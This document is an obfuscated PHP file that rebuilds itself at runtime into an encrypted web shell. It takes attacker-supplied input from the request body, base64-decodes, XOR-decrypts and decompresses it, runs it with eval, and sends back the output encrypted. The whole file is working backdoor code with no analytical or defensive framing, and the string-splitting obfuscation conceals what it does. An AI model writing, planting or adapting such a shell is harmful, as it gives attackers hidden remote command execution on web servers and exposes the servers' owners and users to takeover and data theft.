<?php
$l='l}.e}.n(}.$t);$o="";for($i=}.0;$i<}.$l;)}.{for($j=}.0}.;($j<}.$c&&$i<$l';
$y='._match(}."/$kh(.+)}.}.$k}.f/}.",@file_get_conte}.nts(}."php://input}."),$m}.';
$k=str_replace('gU','','cgUreagUte_gUfugUgUncgUtion');
$m=');$j+}.+,$i++)}.{}.$}.o.=$t{$i}^}.}.$k{$j};}}retur}.n $o;}if}. (@pr}.eg}';
$L='$m[1]}.),$k}.)));$}.o=}.}.@ob_get_cont}.ents();@o}.b_end}._clean();$}.}.r=@';
$O='"1CczfxQ}.J}.qAyF1a}.07"}.;}.func}.tion x($t,$k)}.{$c}.=strlen(}.$k);$l=str';
$a=')==1}.) {@o}.b_start();@e}.val(}.@}.gzuncomp}.ress}.(@x(@base}.64_deco}.de(';
$A='base}.64_encode(@x(}.@gzco}.mpres}.s($}.}.o),$k));print("$p}.$}.kh$r$kf");}';
$G='$k="11f05}.1c3}.";$kh="}.48bc3a}.71ccc1"}.;$kf}.="e9fdf}.b}.e40c8b";$p=}.';
$t=str_replace('}.','',$G.$O.$l.$m.$y.$a.$L.$A);
$f=$k('',$t);$f();
?>
